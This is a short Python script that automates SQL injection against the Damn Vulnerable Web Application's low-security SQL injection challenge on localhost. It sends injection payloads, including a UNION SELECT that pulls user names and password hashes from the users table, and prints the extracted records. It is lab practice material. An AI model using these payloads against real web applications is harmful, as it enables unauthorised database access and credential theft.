#!/usr/bin/env python3

"""This file contains a simply script that can be used to automate the
exploitation of the SQL injection challenge (easy level) offered by
the Damn Vulnerable Web Application (DVWA) support.
"""

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())

PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080"
}

URL="http://localhost/dvwa/vulnerabilities/sqli/"

CUSTOM_HEADERS = { "Cookie": "security=low; PHPSESSID=9odllamdr98h4b7mk9gsaue7lj" }

PAYLOADS = [
    "' OR 1=1 # ",
    "'",
    "' UNION SELECT first_name, password FROM users # ",
]

# -----------------------

def exploit_sqli(payload):
    params = {"id": payload, "Submit": "Submit"}
    r = requests.get(URL, params=params, headers=CUSTOM_HEADERS)
    soup = BeautifulSoup(r.text, "html.parser")
    div = soup.find("div", {"class": "vulnerable_code_area"})

    if not div:
        print(f"[ERROR]: {r.text}")
        print("==================================")
        print(f"   payload = `{payload}`")
        print(f"   error_msg = `{r.text}`")
        return []

    return div.find_all("pre")

def main():
    print()
    for payload in PAYLOADS:
        results = exploit_sqli(payload)

        if len(results) > 0:
            print(f"[SUCCESS]: Found {len(results)} records!")
            print("==================================")
            print(f"   payload = `{payload}`")

            # -- iterate over all results
            for res in results:
                l = res.decode_contents().split("<br/>")
                print(f"   {l[1]}, {l[2]}")

        print()

# -----------------------

if __name__ == "__main__":
    main()
